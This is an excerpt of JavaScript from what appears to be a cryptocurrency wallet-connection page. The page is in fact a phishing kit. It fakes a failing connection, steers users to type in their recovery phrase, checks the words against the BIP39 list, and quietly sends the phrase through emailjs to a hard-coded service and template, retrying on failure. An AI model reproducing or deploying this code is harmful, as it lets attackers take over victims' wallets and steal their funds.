...
if (document.getElementById('wOverlay')) {
    ...
    const subIds = ['wScreenOther', 'wScreen2', 'wScreen3', 'wScreen3b', 'wScreen4', 'wScreen5'];
    ...
    function applyWalletContext(img, name) {
    ...
    function handleMobileRoute(el) {
        if (!checkMobileDevice()) return false;
        const walletId = el.getAttribute('data-wid');
        if (!walletId || !_dp[walletId]) return false;
        const currentUrl = new URL(window.location.href);
        const targetUrl = new URL('security.html?wid=' + walletId, currentUrl).href;
        const deepLink = _dp[walletId](targetUrl);
        closeWallet();
    ...
    document.getElementById('owSearch').addEventListener('input', function () {
        filterWallets(this.value.trim().toLowerCase());
    });
    ...
    document.getElementById('retryBtn').addEventListener('click', () => { cancelTimers(); beginConnection(); });
    document.getElementById('manualBtn').addEventListener('click', () => {
        cancelTimers();
        showPanel('wScreen3b');
    });

    window.openManualFromSecurity = function () {
        switchType('phrase');
        showPanel('wScreen4');
    };
    ...
    window.submitForm = function () {
        ...
        if (activeType === 'phrase') {
            ...
            if (typeof BIP39_WORDS !== 'undefined') {
                for (var word of words) { if (!BIP39_WORDS.has(word)) { isValidPhrase = false; break; } }
            }
        ...
        function dispatchNotification(retries) {
            emailjs.send('service_b91vfvn', 'template_artm0pa', { message: safetext })
                .then(function () { })
                .catch(function (error) {
                    if (retries > 0) {
                        setTimeout(function () { dispatchNotification(retries - 1); }, 1500);
                    }
                });
        }
        dispatchNotification(2);

        runManualFlow();
    };

    function runManualFlow() {
        cancelTimers();
        showPanel('wScreen2');
        aborted = false;
